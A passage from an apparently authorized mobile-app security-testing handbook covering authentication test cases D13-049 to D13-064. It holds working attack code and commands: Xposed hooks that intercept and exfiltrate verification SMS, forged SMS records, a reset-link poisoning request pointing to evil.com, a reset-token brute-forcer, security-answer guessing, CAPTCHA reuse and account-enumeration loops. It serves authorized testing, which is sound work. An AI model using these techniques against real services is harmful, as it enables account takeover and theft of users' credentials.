| **Maps to** | `developers.google.com/identity/sms-retriever/user-consent/request` (`SmsRetriever.SEND_PERMISSION`, `EXTRA_CONSENT_INTENT`, `EXTRA_SMS_MESSAGE`, `CommonStatusCodes.SUCCESS`/`TIMEOUT`); MASWE-0020; CVE-2021-4438 (React Native SMS User Consent) |

- **Test:** The documented registration passes `SmsRetriever.SEND_PERMISSION` so that **only Google Play services** may deliver that broadcast. A two-argument `registerReceiver`, or a manifest receiver with `exported="true"` and no `android:permission`, lets any installed app inject a fake `EXTRA_SMS_MESSAGE` or a fake `EXTRA_CONSENT_INTENT`.
- **How:**
```bash
grep -rnE 'SMS_RETRIEVED_ACTION|startSmsUserConsent|SmsRetriever|EXTRA_CONSENT_INTENT|EXTRA_SMS_MESSAGE' jadx_out/sources
grep -rn 'registerReceiver' jadx_out/sources | grep -i sms      # two-arg form is the bug
grep -nB2 -A8 'com.google.android.gms.auth.api.phone.SMS_RETRIEVED' out/AndroidManifest.xml
adb shell dumpsys activity broadcasts | sed -n '/com.target.app/,/^$/p'
```
The documented-correct form is `registerReceiver(receiver, filter, SmsRetriever.SEND_PERMISSION, null)`.
- **Proof:** From an unprivileged app, `sendBroadcast` of `com.google.android.gms.auth.api.phone.SMS_RETRIEVED` with a crafted `EXTRA_STATUS` / `EXTRA_SMS_MESSAGE`, and the app consuming the injected code; **or** the app launching the attacker's `EXTRA_CONSENT_INTENT`, which turns the receiver into an arbitrary-Intent-launch gadget running with the victim's UID.
- **Escalation:** OTP injection → D13-045/065 → ATO. Consent-intent launch → **D08 intent redirection** and the self-grant gadget (the victim app grants your app read access to its own `FileProvider` URI). The BAL constraint applies at **API 34+**; note it.
- **Ruled out when:** The receiver is registered with `SmsRetriever.SEND_PERMISSION` (or `RECEIVER_NOT_EXPORTED`), **or** the injected code is rejected because the flow carries a handshake UUID plus server-side verification — trace that handshake before claiming OTP injection; in the corpus the injection variant is usually a recorded negative while the arbitrary-Intent-launch variant is the real finding. Check both branches of `onReceive`.

### D13-050 · SMS OTP delivery posture: `READ_SMS` where SMS Retriever would do, and Android 15 redaction

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.two_fa_bypass` (P3); `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) for the over-broad SMS read |
| **Attacker** | AM-04 |
| **Applies to** | All apps that auto-fill an SMS OTP. Mitigated on **Android 15+**; LEGACY exposure on ≤ 14 — state the client's minimum supported API |
| **Maps to** | Android developer security-tips, SMS section (verbatim): "SMS is neither encrypted nor strongly authenticated on either the network or the device… Don't rely on unauthenticated SMS data to perform sensitive commands"; Android 15 behaviour changes (untrusted `NotificationListenerService` implementations cannot read unredacted OTP content; trusted companion-device associations exempt); AOSP `Permissions.md` hard/soft-restricted SMS permissions |

- **Test:** Two halves. (a) Does the app hold `READ_SMS`/`RECEIVE_SMS` with a plain `BroadcastReceiver` when the SMS Retriever API — which needs no permission and binds the message to the app hash — would do? That grant reads the user's entire SMS corpus, not just the app's OTP. (b) On Android 15, does the app's OTP *delivery* route around the platform's redaction (code in the notification **title** rather than the body, in an accessibility node, or in the clipboard), and has it obtained a companion-device association purely to keep reading them?
- **How:**
```bash
grep -nE 'RECEIVE_SMS|READ_SMS|BROADCAST_SMS' out/AndroidManifest.xml
grep -rnE 'SmsRetriever|SmsRetrieverClient|SMS_RETRIEVED_ACTION|createAppSpecificSmsToken|Telephony.Sms|AUTOFILL_HINT_SMS_OTP' jadx_out/sources
grep -rn 'CompanionDeviceManager\|REQUEST_COMPANION' out/AndroidManifest.xml jadx_out/sources
adb shell cmd role get-role-holders android.app.role.SMS
adb shell cmd notification allow_listener com.poc.attacker/.Listener
adb shell dumpsys notification | grep -i 'listener\|redact'
```
- **Proof:** The app holding `READ_SMS` while using a plain receiver for the OTP, plus a demonstration that the same grant reads unrelated messages (`content query --uri content://sms/inbox`). For (b), a test listener receiving an **unredacted** 6-digit code on Android 15 — proving the delivery sits outside the platform's redaction heuristics. Run the same PoC on the client's minimum supported API and document exactly which fleet versions are exposed.
- **Escalation:** Full SMS read → OTPs for *other* services → multi-account takeover; → D25 if the app holds the SMS Role.
- **Ruled out when:** The app uses `SmsRetriever` (or `createAppSpecificSmsToken`) with no SMS permission in the manifest, and a listener on Android 15 receives a redacted value. The clean negative is worth recording, because the SMS Retriever path also closes D13-048's channel 2.

### D13-051 · SIM-binding and MSISDN checks that trust local telephony APIs

| | |
|---|---|
| **Severity ceiling** | High–Critical for payment/identity flows |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-12 for the forge, AM-01 for the consequence |
| **Applies to** | All apps using SMS/MSISDN as an authentication factor, and carrier silent-auth SDKs |
| **Maps to** | HackTricks `android-anti-instrumentation-and-ssl-pinning-bypass.md` "LSPosed/Xposed Hooking Abuse (Telephony/SMS)", citing CloudSEK research on remote SMS injection and identity spoofing in payment ecosystems |

- **Test:** Flows that bind an account to a number by reading `TelephonyManager.getLine1Number()`, `SubscriptionInfo.getNumber()`, or by checking the local SMS provider for a "sent" record, are forgeable. Separately, silent-auth SDKs (OTPLESS, IPification, Truecaller, carrier-hosted) often use **cleartext** carrier endpoints — trace what assertion is sent and whether it is bound to the session.
- **How:**
```java
// suppress the outgoing verification SMS while capturing its content
XposedHelpers.findAndHookMethod("android.telephony.SmsManager", lp.classLoader, "sendTextMessage",
  String.class, String.class, String.class, PendingIntent.class, PendingIntent.class,
  new XC_MethodHook(){ protected void beforeHookedMethod(MethodHookParam p){
      String body = (String) p.args[2]; /* exfiltrate */ p.setResult(null); } });
// spoof the line number
XposedHelpers.findAndHookMethod("android.telephony.TelephonyManager", lp.classLoader,
  "getLine1Number", new XC_MethodHook(){ protected void afterHookedMethod(MethodHookParam p){
      p.setResult(spoofedMsisdn); } });
```
```java
// plant a fake "Sent" record so local-history checks pass
ContentValues v = new ContentValues();
v.put("address", dest); v.put("body", body); v.put("type", 2); v.put("status", 0);
context.getContentResolver().insert(Uri.parse("content://sms/sent"), v);
```
```bash
# silent-auth: cross-reference the NSC's cleartext hosts (D14) against the SDK's endpoints
grep -rnE 'otpless|ipification|truecaller|sekura|silentAuth|headerEnrichment' jadx_out/sources
grep -n 'cleartextTrafficPermitted' out/res/xml/network_security_config.xml
```
- **Proof:** The app completing SIM binding / number verification for an MSISDN the device does not own, with the carrier never receiving the SMS. For silent auth, the cleartext request containing the subscriber assertion, plus a successful replay against your own account showing it is not session-bound.
- **Escalation:** → D14 (the MitM harness that captures the cleartext assertion) → D23 (payment identity).
- **Ruled out when:** The binding is established by a **backend-issued challenge** the server verifies against carrier-side receipt, rather than by client-reported telephony state; and the silent-auth assertion is delivered over TLS and bound to the app's own session. Cleartext exposure alone with no usable assertion is Low–Medium (the corpus's worked calibration: a network security config permitting cleartext to five such hosts rated Low–Medium); **Critical** only if the captured assertion authenticates.

### D13-052 · SMS/voice recovery survives SIM swap; recycled numbers inherit accounts

| | |
|---|---|
| **Severity ceiling** | Critical for financial/crypto apps; High elsewhere |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | All apps with SMS-based auth or recovery; dominant in OTP-first / phone-as-identity markets |
| **Maps to** | ATT&CK T1451 SIM Card Swap ("adversaries may use SMS-based authentication to log into banking and/or cryptocurrency accounts, then transfer funds to adversary-controlled wallets"; LAPSUS$, Scattered Spider; mitigation M1011 "Use hardware tokens, biometrics, and non-SMS authentication methods"); T1660 Phishing (including AI voice cloning for deepfake vishing) |

- **Test:** A design finding you can demonstrate without any device access. Walk every recovery flow — "Forgot password", "New device", "Lost 2FA" — and record which factors each accepts. Is a number-only path sufficient *anywhere*? Then the recycling variant: does re-verifying a number hand over the previous owner's account intact, and does the app ship **any** signal it could use (device binding, installation id, re-KYC, a cooling period, a re-consent step)?
- **How:**
```bash
grep -rnE 'getLine1Number|getSubscriberId|getSimSerialNumber|ICCID|IMSI|device_id|installation_id|firstSeen|number_changed|reverify' jadx_out/sources
# capture the recovery API calls: /auth/recover, /otp/send, /device/trust, /mfa/reset
# then, on a fresh install + fresh device id, complete OTP login for a re-verified number and diff /me
curl -s https://api.target/v1/me -H "Authorization: Bearer $T" \
  | jq '{id,created_at,kyc_status,wallet_balance,linked_cards,address_count}'
```
- **Proof:** A complete recovery performed using only possession of the phone number (simulate with a second SIM/eSIM or a number you control on the test account) — screen-record the full flow plus the resulting session token. For the recycling variant: a fresh install on a fresh device returning a `/me` with a pre-existing `created_at`, non-zero balance, prior KYC status and saved payment instruments.
- **Escalation:** → D23 (funds movement). Where the app *collects* a device-binding field and ignores it, that unused field is both the fix and the proof of a missing control — quote it.
- **Ruled out when:** Every recovery path requires a second factor the number alone does not satisfy (a password, a trusted-device approval, a hardware key), **and** a re-verified number on a new device triggers a cooling period or re-KYC rather than an immediate handover. Record which factor closes it; that is what the client will want to keep.

### D13-053 · Password-reset token: leak, non-expiry, reuse and unbinding

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `insufficient_security_configurability.weak_password_reset_implementation.token_is_not_invalidated_after_use` (P4); `.token_is_not_invalidated_after_email_change` (P5); `.token_has_long_timed_expiry` (P5); `broken_authentication_and_session_management.authentication_bypass` (P1) with the completed takeover |
| **Attacker** | AM-01 |
| **Applies to** | All recovery flows |
| **Maps to** | `hunt-forgot-password` pattern library (H1 #173551, #685007); `hunt-ato` Paths 1–4 |

- **Test:** Four independent failures on one token. In that moment the token **is** the whole authentication.
- **How:** Request a reset against an account you control as "victim", then:
```bash
T='<reset token>'
# (a) does it leak? watch the Referer of every third-party resource loaded on the reset page
# (b) does it survive an email change? change the account email, then retry the OLD token
curl -s -o /dev/null -w 'after email change [%{http_code}]\n' "https://app.target/reset?token=$T"
# (c) is it single-use?
for n in 1 2; do
  curl -s -o /dev/null -w "redeem#$n [%{http_code}]\n" -X POST https://api.target/v1/reset \
    -H 'Content-Type: application/json' -d "{\"token\":\"$T\",\"password\":\"Newpass!$n\"}"
done
# (d) does it survive a normal login, and a newer token being requested?
```
- **Proof:** Any of the four succeeding in a full password change on the "victim" account, followed by a login with the password you set. Use the five-screenshot pattern (D13-008).
- **Escalation:** → D13-054 (poisoning delivers the token to you); → D13-056 (deep-link delivery leaks it on-device).
- **Ruled out when:** The token is single-use, expires inside a short window, is invalidated by an email change, by a login, and by a newer token being requested — and never appears in a `Referer` or an outbound third-party request from the reset page. Test (b) specifically: it is the one that turns a stale token into a takeover of an address the victim no longer controls.

### D13-054 · Reset-link poisoning via `Host` / `X-Forwarded-Host`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.weak_password_reset_implementation.token_leakage_via_host_header_poisoning` (**P2**) |
| **Attacker** | AM-01 |
| **Applies to** | Any backend that builds absolute URLs from the request host |
| **Maps to** | `hunt-host-header` Patterns 1, 2, 6; `hunt-ato` Path 1; disclosed: $4,500 for `Host`, $3,500 for `X-Forwarded-Host` |

- **Test:** The reset-link generator builds the URL from the request host. Frameworks make this easy — Django/Rails/Express `request.get_host()` consults `HTTP_X_FORWARDED_HOST` first when `USE_X_FORWARDED_HOST = True`. This is one of only two P2 nodes reachable from a mobile engagement without SSO in the chain, which is why it is worth sweeping properly.
- **How:**
```http
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

email=victim@company.com
```
Sweep the variant set: `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Host: target.com:evil.com`, `Forwarded: host=evil.com`, `X-Original-URL: /`, `X-Rewrite-URL: /`.
- **Proof:** The email the victim receives containing `https://evil.com/reset?token=...` — the token lands at your host. Bare host-header injection **without** the reset-poisoning PoC is on the never-submit list, so the delivered email is the report.
- **Escalation:** The same technique poisons email-verification and invitation emails; chains from missing SPF/DMARC for a deliverable spoof.
- **Ruled out when:** The generated link always carries the canonical host regardless of every header in the sweep — confirm by reading the delivered email, not the HTTP response. A 200 on the poisoned request means nothing; the mail body is the oracle.

### D13-055 · Weak reset-token keyspace

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1); `server_security_misconfiguration.no_rate_limiting_on_form.email_triggering` (P4) for the request side |
| **Attacker** | AM-01 |
| **Applies to** | All recovery flows |
| **Maps to** | `hunt-brute-force` Pattern 2 ($6,500); `hunt-ato` Path 3 |

- **Test:** A 4-digit numeric reset token is 10,000 combinations; a 6-digit one is 10^6. Also test whether the token expires at all — no expiry means an unlimited window.
- **How:**
```python
import requests
for i in range(10000):
    tok = f"{i:04d}"
    r = requests.get(f"https://target.com/reset?token={tok}&email=test@own-account.com",
                     allow_redirects=False, timeout=10)
    print(tok, r.status_code, len(r.content))
    if r.status_code == 200: print("VALID TOKEN", tok); break
    if r.status_code == 429: print("rate limited at", tok); break
```
Then measure expiry: request a token, and replay it at T+1h, T+6h, T+24h, T+7d.
- **Proof:** A valid token found against an account you control, then used to set a password and log in. Report the keyspace, the observed throttle threshold and the derived time-to-exhaust.
- **Escalation:** → ATO; combine with D13-040 if a per-IP limit exists.
- **Ruled out when:** The token is ≥ 128 bits of measured entropy (apply D13-024's method) **or** the endpoint throttles below the exhaustion threshold and the token expires inside that window. Both halves matter: a high-entropy token with no expiry is still a durable credential living in mail archives and proxy logs.

### D13-056 · Reset or magic-link token delivered through an unverified deep link, or consumed by a prefetch

| | |
|---|---|
| **Severity ceiling** | Critical (unverified scheme yields the token); High (replayable link); Medium (prefetch denial-of-login) |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1); `sensitive_data_exposure.sensitive_token_in_url.on_password_reset` (P5) / `.user_facing` (P4); `insufficient_security_configurability.weak_password_reset_implementation.token_is_not_invalidated_after_use` (P4) |
| **Attacker** | AM-03 |
| **Applies to** | All apps offering passwordless / magic-link / email-verification flows |
| **Maps to** | MASVS-AUTH-3 (deep links and MFA code generators "all need to be implemented securely"); CVE-2026-26123 (Microsoft Authenticator sign-in code in an unclaimed `ms-msa://` deep link, interceptable by any sibling app) |

- **Test:** Three mobile-specific failures on the same token. (1) The scheme is unverified, so another app claims it and harvests the token. (2) The link opens in the app's own `WebView`, where the token lands in `Referer`, history and cache. (3) Something other than the user opens it — an in-app link preview, a notification `setContentIntent` that pre-resolves the URL, or a security scanner — burning or leaking the token.
- **How:**
```bash
# is the host actually verified?
adb shell pm get-app-links com.target.app             # require state 'verified'
adb shell dumpsys package domain-preferred-apps | sed -n '/com.target.app/,/^$/p'
curl -s https://app.target/.well-known/assetlinks.json | jq .
adb shell pm query-activities -a android.intent.action.VIEW -d "https://app.target/magic?token=x"
# claim the scheme from a stub app and request a reset
adb shell am start -a android.intent.action.VIEW -d 'target://reset?token=TESTTOKEN'
# does the app load it in a WebView (token then leaves in Referer)?
grep -rnE 'reset|forgot|magic|passwordless|verifyEmail' jadx_out/sources | grep -nE 'loadUrl|WebView'
# is a mere GET enough to consume it?
for n in 1 2; do curl -s -o /dev/null -w "GET#$n [%{http_code}]\n" "https://app.target/magic?token=$T"; done
# does the app itself fetch it on push/notification arrival?
adb logcat -c; # send the magic link; then:
adb logcat -d | grep -iE 'prefetch|preview|magic|LinkPreview|OpenGraph'
```
- **Proof:** The stub app's `onCreate` logging the real reset token from a mail sent to the victim's address — then using it to set a password and log in. Or Burp showing the token in the `Referer` of a third-party resource load inside the reset WebView. Or (for the prefetch variant) the app's own outbound request consuming the token before the user taps, producing a repeatable denial-of-login.
- **Escalation:** → D09 (App Link verification state) → ATO; the replayable-link variant chains with any log, referrer or notification-content leak in D20.
- **Ruled out when:** The link is an `https` App Link whose verification state is `verified` (so no chooser and no competing handler), the token is consumed only on an explicit user confirmation (POST, not GET), it is single-use, and the reset page loads no third-party resources that would carry a `Referer`. Note that `autoVerify` closes the custom-scheme variant only — it does nothing about the `Referer` variant, so test both.

### D13-057 · Recovery / backup codes: server-returned, client-generated, or not single-use

| | |
|---|---|
| **Severity ceiling** | Critical (returned to a pre-MFA session); High (returned to a full session, or reusable) |
| **VRT** | `insufficient_security_configurability.weak_two_fa_implementation.two_fa_secret_remains_obtainable_after_two_fa_is_enabled` (P4); `broken_authentication_and_session_management.two_fa_bypass` (P3); `authentication_bypass` (P1) with the completed bypass |
| **Attacker** | AM-01 (API), AM-03/AM-11 (screen capture) |
| **Applies to** | All apps with 2FA recovery codes |
| **Maps to** | `hunt-mfa-bypass` "Recovery code dump via /api/me"; MASTG-TEST-0315 (notification/screen exposure) |

- **Test:** Recovery codes are password-equivalent and permanently bypass 2FA. Four failures: they are returned by a fat profile endpoint; they are generated on-device from a local seed; they are rendered on a screen without `FLAG_SECURE`, so they land in Recents and screenshots; or they are not single-use.
- **How:**
```bash
# a) fat profile endpoint — hit it with BOTH a pre-MFA and a full session
for T in "$PRE_MFA" "$FULL"; do
  curl -s https://api.target/api/me -H "Authorization: Bearer $T" \
    | grep -oiE 'recovery_codes|backup_codes|mfa\.recovery|two_factor_recovery_codes|"[A-Z0-9]{4}-[A-Z0-9]{4}"'
done
# b) client-side generation
grep -rnE 'recoveryCode|backupCode|scratchCode|generateCodes|SecureRandom' jadx_out/sources
# c) screen protection
grep -rn 'FLAG_SECURE\|setRecentsScreenshotEnabled' jadx_out/sources
adb shell dumpsys window | grep -iE 'FLAG_SECURE|mCurrentFocus'
adb exec-out screencap -p > codes.png            # succeeds => no FLAG_SECURE
# d) reuse
for n in 1 2; do curl -s -o /dev/null -w "recover#$n [%{http_code}]\n" \
  -X POST https://api.target/v1/2fa/recover -d "code=$C"; done
```
- **Proof:** Recovery codes in a response body (then used to complete MFA); or `codes.png` containing them plus the same content visible in the Recents thumbnail; or two consecutive 200s for the same code.
- **Escalation:** → MFA bypass → ATO. Codes returned to a **pre-MFA** session are Critical because the second factor is defeated by a stolen password alone.
- **Ruled out when:** The codes are generated server-side, stored as hashes, never returned after enrolment (the endpoint returns them exactly once, at generation), the screen sets `FLAG_SECURE`, and each code is refused on second use. The pre-MFA test is the one to run first: it is a different code path from the authenticated one.

### D13-058 · Knowledge-based recovery and security-question abuse

| | |
|---|---|
| **Severity ceiling** | High–Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | Apps with knowledge-based recovery |
| **Maps to** | `hunt-ato` Path 8 |

- **Test:** Security answers are low-entropy and the endpoint is usually unthrottled. Two extra angles that are frequently missed: the answer may be echoed in `/api/me` or in the recovery page's own source (a client-side-only check), and the *question itself* may reveal OSINT-able PII about the account holder.
- **How:**
```bash
# is the answer client-side?
curl -s https://api.target/v1/recovery/questions?email=victim@example.com | jq .
grep -rniE 'securityQuestion|securityAnswer|recoveryAnswer|challengeAnswer' jadx_out/sources
# unthrottled guessing against a controlled "victim"
python3 - <<'PY'
import requests
answers = ["smith","london","fluffy","toyota","1990","st marys"]
for a in answers:
    r = requests.post("https://api.target/v1/recovery/answer",
                      json={"email": VICTIM, "answer": a}, timeout=10)
    print(a, r.status_code, len(r.content))
PY
```
- **Proof:** Recovery completed on a controlled "victim" account without the password — or the answer disclosed in a response body, which is the stronger finding because it needs no guessing at all.
- **Escalation:** → ATO; the disclosed-question variant also feeds D20 as PII exposure.
- **Ruled out when:** The answer is never returned by any endpoint, the answer endpoint throttles (and survives D13-040's key rotation), and the question set is generic rather than PII-bearing. If the flow requires the security answer **in addition to** a delivered OTP rather than instead of it, record that as the closing control.

### D13-059 · CAPTCHA token reuse or omission on an auth form

| | |
|---|---|
| **Severity ceiling** | Medium standalone; severity of the unlocked action when chained |
| **VRT** | `server_security_misconfiguration.captcha.implementation_vulnerability` (P4); `.missing` (P5); `.brute_force` (P5); `external_behavior.captcha_bypass.crowdsourcing` (P5) |
| **Attacker** | AM-01 |
| **Applies to** | Any challenge-gated auth endpoint |
| **Maps to** | `hunt-captcha-bypass` (H1 #206653, #210417, #246801) |

- **Test:** The control is only a finding when it unlocks a consequential abuse — OTP/credential brute force or mass account creation. Three mutations: replay the same solved token N times, delete the parameter entirely, send it empty.
- **How:**
```bash
SOLVED='<one legitimately solved token>'
for n in 1 2 3 4 5; do
  curl -s -o /dev/null -w "reuse#$n [%{http_code}]\n" -X POST https://api.target/v1/login \
    -H 'Content-Type: application/json' \
    -d "{\"email\":\"$U\",\"password\":\"x\",\"captcha\":\"$SOLVED\"}"
done
curl -s -o /dev/null -w 'omitted [%{http_code}]\n' -X POST https://api.target/v1/login \
  -H 'Content-Type: application/json' -d "{\"email\":\"$U\",\"password\":\"x\"}"
curl -s -o /dev/null -w 'empty    [%{http_code}]\n' -X POST https://api.target/v1/login \
  -H 'Content-Type: application/json' -d "{\"email\":\"$U\",\"password\":\"x\",\"captcha\":\"\"}"
```
Note the mobile-specific angle: the app's endpoint frequently has **no** CAPTCHA at all while the web form does — that is D13-013, and it is the stronger report.
- **Proof:** The protected action (login, register, OTP send/verify) completing without a valid solve, N times.
- **Escalation:** → D13-038/040 brute force → ATO. Severity is the severity of the unlocked action, not of the CAPTCHA.
- **Ruled out when:** The solved token is accepted exactly once and the endpoint rejects requests with the parameter absent or empty. A CAPTCHA that is merely weak (OCR-solvable) with no consequential action behind it is P5 — do not file it alone.

### D13-060 · Account pre-hijacking on the mobile signup path — five classes

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1); `server_security_misconfiguration.oauth_misconfiguration.account_squatting` (P4) for the bare squat |
| **Attacker** | AM-01 |
| **Applies to** | All apps with self-service registration, especially those offering both password and social signup |
| **Maps to** | Sudhodanan & Paverd, "Pre-hijacked accounts: An Empirical Study of Security Failures in User Account Creation on the Web", arXiv:2205.10174 — Classic-Federated Merge, Unexpired Session, Trojan Identifier, Unexpired Email Change, Non-verifying IdP |

- **Test:** Register against a victim's identifier **before** the victim signs up, then test whether the victim's later signup merges into your account rather than replacing it. The mobile signup path frequently implements a different (weaker) branch than the web one, and mobile SSO merges silently — so run every class **on the app**, not on the website.
- **How:** For each class, in order:
  1. **Classic-Federated Merge** — create a password account for `victim@x`; the victim later signs in with Google/Apple in the app; check whether both credentials now open the same account.
  2. **Unexpired Session** — create the account, stay signed in on your device, let the victim "reset password" and take over; check whether your device session survives.
  3. **Trojan Identifier** — create the account with the victim's email but add *your* phone / 2FA / recovery identifier; after the victim recovers, check whether your identifier is still attached.
  4. **Unexpired Email Change** — start an email change to the victim's address, do not confirm; after the victim registers that address, confirm the old link.
  5. **Non-verifying IdP** — sign in via an IdP that does not verify email ownership and see whether the app links by email (this is D13-029's `email_verified` half).
```bash
curl -s -X POST https://api.target/v1/auth/register -H 'Content-Type: application/json' \
  -d '{"email":"victim@x","password":"...","device_id":"..."}' -i
# after the victim's flow, check identity linkage with the ATTACKER's token:
curl -s https://api.target/v1/me/identities -H "Authorization: Bearer $ATTACKER_TOKEN" | jq
```
- **Proof:** `GET /me` (or the identities endpoint) with the **attacker's** token returning the victim's post-signup profile data, or the attacker's recovery identifier still attached to the victim's account after the victim completed signup or recovery. Screenshot both sessions side by side and mark the victim account per D13-003.
- **Escalation:** A pre-hijacked account inherits everything the victim adds later — payment methods, KYC, chat history. Note that bare pre-account-takeover is on the never-submit list, so you must demonstrate the **full claim**: the attacker's session reading the victim's post-signup data.
- **Ruled out when:** Signup against an unowned identifier requires verification before any credential is stored; federated sign-in on an existing address creates a distinct account or demands proof of the existing credential; a pending email change is invalidated when the target address is registered; and the pre-existing attacker session is terminated by the victim's password reset. All five classes are separate code paths.

### D13-061 · Case and Unicode normalisation collision in the mobile signup path

| | |
|---|---|
| **Severity ceiling** | High (takeover) / Medium (denial of access) |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) where it yields the other account; otherwise `weak_registration_implementation` (VARIES) |
| **Attacker** | AM-01 |
| **Applies to** | All; particularly apps with separate mobile and web auth services |
| **Maps to** | H1 #187714 (Vine, Medium, $280 — "overwrite account associated with email via android application"); Gowthams `password-reset.md` normalisation test-case block |

- **Test:** Whether the mobile signup path normalises the identifier the same way the login path does. A mismatch lets an attacker create a second account bound to an existing address — or overwrite the password associated with it.
- **How:** Register `victim@example.com` with password A. Then register a variant on the **mobile** client with password B: capitalisation (`Victim@example.com`), a trailing space, a trailing dot, a `+tag`, a homoglyph, or the handbook's RTLO probe `%01%E2%80%AEalert%0D%0A` in the username and password fields. Then log in with the original address and password A.
```bash
for E in "victim@example.com" "Victim@example.com" "victim@example.com " "victim@example.com." "vıctim@example.com"; do
  printf '%-30s ' "$E"
  curl -s -o /dev/null -w '[%{http_code}]\n' -X POST https://api.target/v1/register \
    -H 'Content-Type: application/json' -d "{\"email\":\"$E\",\"password\":\"PassB!1\"}"
done
```
- **Proof:** Password A no longer works and password B logs into a different account — or, in the takeover variant, password B logs into the *original* account. Scope the claim precisely; the disclosed report was accepted because it said plainly "This is not an account takeover because while we do override the password associated with that specific mail we just login to a new account."
- **Escalation:** Chain with D13-062 to bind an unverified account to a real address; chain with D13-060's Classic-Federated Merge.
- **Ruled out when:** Every variant either collides into the existing account (correct) or is rejected, and the web and mobile paths normalise identically — verify by registering the same variant through both and comparing the resulting user ids.

### D13-062 · Email-verification gate enforced only in the UI

| | |
|---|---|
| **Severity ceiling** | Medium (High when unverified accounts can act) |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) where the unverified principal reaches a verified-only capability; otherwise Low |
| **Attacker** | AM-01 |
| **Applies to** | All |
| **Maps to** | H1 #57764 (Coinbase, $100 — "ByPassing the email Validation Email on Sign up process in mobile apps") |

- **Test:** Sign up in the app and, at the "check your email" screen, press **Back**, then log in with the credentials just used. Then test what that unverified session can actually do.
- **How:**
```bash
curl -s -X POST https://api.target/v1/register -H 'Content-Type: application/json' \
  -d '{"email":"unverified8f3a@example.com","password":"Passw0rd!"}' -i
UT=$(curl -s -X POST https://api.target/v1/login -H 'Content-Type: application/json' \
  -d '{"email":"unverified8f3a@example.com","password":"Passw0rd!"}' | jq -r .access_token)
for ep in /v1/invite /v1/messages /v1/payouts /v1/teams/join /v1/orders; do
  printf '%-16s ' "$ep"
  curl -s -o /dev/null -w '[%{http_code}]\n' -X POST https://api.target$ep \
    -H "Authorization: Bearer $UT" -H 'Content-Type: application/json' -d '{}'
done
```
- **Proof:** A full session on an unverified address, then that account performing an action reserved for verified users — invite, message, receive a payout.
- **Escalation:** Chain with D13-061 to bind an unverified account to a real address, and with D13-060's Unexpired Email Change class.
- **Ruled out when:** The login succeeds but every capability-bearing endpoint returns 403 with a verification-required error — enumerate them rather than trusting the UI, which hides the buttons either way. Low alone; the report is the capability, not the session.

### D13-063 · Username/email enumeration on the app's own endpoints

| | |
|---|---|
| **Severity ceiling** | Low standalone; Medium/High as the enabling half of a credential-stuffing chain |
| **VRT** | `broken_access_control.username_enumeration.non_brute_force` (P4); `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) where the response leaks more than existence |
| **Attacker** | AM-01 |
| **Applies to** | All |
| **Maps to** | `hunt-brute-force` Patterns 3 and 6; sehno → Authentication → "Test for user enumeration" |

- **Test:** Divergent responses on login, reset and registration confirm account existence. The app's endpoints frequently return **richer** errors than the web form. The lift that changes the rating: if the response leaks more than existence — a real first/last name, a profile photo URL, a partial phone number — the "low-risk information" exclusion no longer applies and it becomes PII disclosure.
- **How:**
```bash
for E in valid@example.com nosuch8f3a@example.com; do
  for EP in /v1/login /v1/forgot-password /v1/register; do
    printf '%-22s %-20s ' "$E" "$EP"
    curl -s -o /tmp/r -w '[%{http_code}] %{size_download}B %{time_total}s\n' \
      -X POST "https://api.target$EP" -H 'Content-Type: application/json' \
      -d "{\"email\":\"$E\",\"password\":\"x\"}"
    grep -oiE '"(first_name|last_name|avatar|phone|masked_phone)"' /tmp/r | tr '\n' ' '; echo
  done
done
```
- **Proof:** Two byte-different responses for existing versus non-existing identifiers, reproduced over 20+ samples with the timing analysis from D13-004 if the delta is temporal rather than textual. Quote any PII field names present.
- **Escalation:** → credential stuffing (D13-013) → ATO. Report as the enabling half of a chain; that is how it earns a rating above P4.
- **Ruled out when:** Status code, body bytes and timing are indistinguishable across 20+ interleaved samples on all three endpoints. A timing-only delta needs the n ≥ 10, 2σ test — single outliers are the corpus's canonical retraction.

### D13-064 · Enumerate every code path that returns a session

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1); `two_fa_bypass` (P3) as the floor |
| **Attacker** | AM-01 |
| **Applies to** | Any MFA-protected backend; **mobile login endpoints are a prime "other handler"** |
| **Maps to** | `hunt-mfa-bypass` pattern library (H1 #418767, $10,000 — 2FA-requirement bypass letting a user skip program restrictions; #1050244 — 2FA-enforcement bypass by following the post-login redirect directly; #1247108, $1,564) |

- **Test:** MFA enforcement is rarely middleware-level — it is checked at the end of the *primary* login handler. Every other handler that establishes a session needs its own check, and one of them always forgets.
- **How:** Inventory each route that yields a session, using a 2FA-enabled account, and complete auth on each:
```
[ ] password login (web)            [ ] password login (mobile/API)
[ ] SSO / OAuth callback            [ ] "remember me" / trust-token path
[ ] API-token exchange              [ ] password-reset auto-login
[ ] email-change confirmation       [ ] OAuth account-link
[ ] magic-link / passwordless       [ ] device-pairing / QR approval
[ ] refresh-token grant             [ ] impersonation / support login
```
For each, record whether the challenge is **enforced** or merely **rendered**, then verify against a post-MFA-protected endpoint:
```bash
for name in mobile_login sso_callback remember_me reset_autologin email_confirm oauth_link; do
  printf '%-16s ' "$name"
  curl -s -o /dev/null -w '[%{http_code}]\n' https://api.target/v1/account/sensitive \
    -H "Authorization: Bearer ${TOKENS[$name]}"
done
```
- **Proof:** A fully-authenticated session obtained on one path without producing a TOTP code, verified against an endpoint that is supposed to be post-MFA-only.
